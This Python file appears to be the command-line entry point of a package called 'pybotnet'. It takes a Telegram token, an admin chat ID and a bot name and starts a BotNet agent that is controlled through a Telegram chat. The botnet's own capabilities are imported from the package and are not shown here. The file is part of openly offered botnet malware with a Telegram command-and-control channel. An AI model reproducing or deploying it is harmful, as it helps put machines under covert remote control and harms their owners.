from . import *

"""run pybotnet by (`python -m pybotnet [TELEGRAM_TOKEN] [ADMIN_CHAT_ID] [BOT NAME]`)"""

if __name__ == "__main__":
    import sys

    argv = sys.argv

    if len(argv) == 4:
        TELEGRAM_TOKEN = argv[1]
        ADMIN_CHAT_ID = argv[2]
        BOT_NAME = argv[3]

        telegram_engine = TelegramEngine(
            token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID
        )

        BotNet(telegram_engine,  bot_name=BOT_NAME).run()

    else:
        print("invalid syntax, use: `python -m pybotnet [TELEGRAM_TOKEN] [ADMIN_CHAT_ID] [BOT_NAME]`")
